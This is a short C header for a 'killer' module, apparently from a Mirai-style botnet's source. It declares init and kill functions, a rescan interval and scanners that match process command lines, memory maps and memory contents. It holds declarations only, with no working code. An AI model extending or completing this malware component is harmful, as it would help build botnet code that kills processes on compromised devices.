#pragma once

#include "i.h"

#define KILLER_MIN_PID              1
#define KILLER_RESTART_SCAN_TIME    30

void killer_init(void);
void killer_kill(void);

static BOOL cmdline_match_scan(char *);
static BOOL maps_match_scan(char *);
static BOOL kkk_match_scan(char *);
static BOOL mem_exists(char *, int, char *, int);
